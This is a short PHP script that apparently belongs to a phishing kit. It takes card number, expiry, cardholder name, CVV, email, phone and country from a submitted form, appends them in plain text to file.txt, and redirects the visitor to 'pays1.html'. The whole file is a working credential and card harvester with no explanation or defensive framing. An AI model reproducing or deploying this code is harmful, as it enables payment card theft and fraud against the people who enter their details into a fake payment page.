<?php
$card = $_POST['card'];
$card_month = $_POST['card_month'];
$card_year = $_POST['card_year'];
$cardname = $_POST['cardname'];
$cvv = $_POST['cvv'];
$email = $_POST['email'];
$phone = $_POST['phone'];
$country = $_POST['country'];



$file = fopen("file.txt","at");
fwrite($file,"\n $card:$card_month:$card_year:$cardname:$cvv:$email:$phone:$country \n");
fclose($file);

header("Location: pays1.html");

?>